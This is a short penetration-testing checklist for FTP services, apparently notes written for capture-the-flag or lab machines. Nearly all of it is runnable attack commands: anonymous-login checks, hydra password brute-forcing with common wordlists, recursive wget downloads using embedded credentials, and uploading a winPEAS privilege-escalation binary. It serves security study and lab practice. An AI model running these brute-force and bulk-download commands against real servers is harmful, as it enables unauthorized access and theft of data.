# FTP Checklist

1. See if there is anonymous access

```bash
ftp $ip
ftp $ip 21
ftp -A $ip
ftp -A $ip 21
# input anonymous as username and password
# try in the browser
ftp://anonymous:anonymous@10.10.10.98
```

2. Additional Enumeration

```bash
nmap --script ftp-* -p 21 $ip 
```

3. Brute force

```bash
hydra -l USERNAME -P /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f $ip ftp -V
hydra -l steph -P /usr/share/wfuzz/wordlist/others/common_pass.txt $ip -t 4 ftp
hydra -l steph -P /usr/share/wordlists/rockyou.txt $ip -t 4 ftp
hydra -L /opt/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.213.93
hydra -C /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.213.93 ftp
```

3. Recursively download content

```bash
> prompt off
> recurse on
> mget *
```

or

````
wget -r ftp://steph:billabong@10.1.1.68/
wget -r ftp://anonymous:anonymous@192.168.204.157/

find / -name Settings.*  2>/dev/null #looking through the files
````

4. Interact

MAKE SURE THAT THE PERMISSIONS OF YOUR LOCAL FILE ALLOW YOU TO PUT.
````
# Put File
put test.txt #check if it is reflected in a http port

# Upload Binary
ftp> binary
200 Type set to I.
ftp> put winPEASx86.exe
````

#### FTP with OpenSSL

```bash
openssl s_client -connect crossfit.htb:21 -starttls ftp #Get certificate if any

lftp
lftp :~> set ftp:ssl-force true
lftp :~> set ssl:verify-certificate no
lftp :~> connect 10.10.10.208
lftp 10.10.10.208:~> login                       
Usage: login <user|URL> [<pass>]
lftp 10.10.10.208:~> login username Password

```

#### Hydra for Simple Bruteforce

```bash
hydra -L usernames-shortlist -P best1050 $ip ftp
```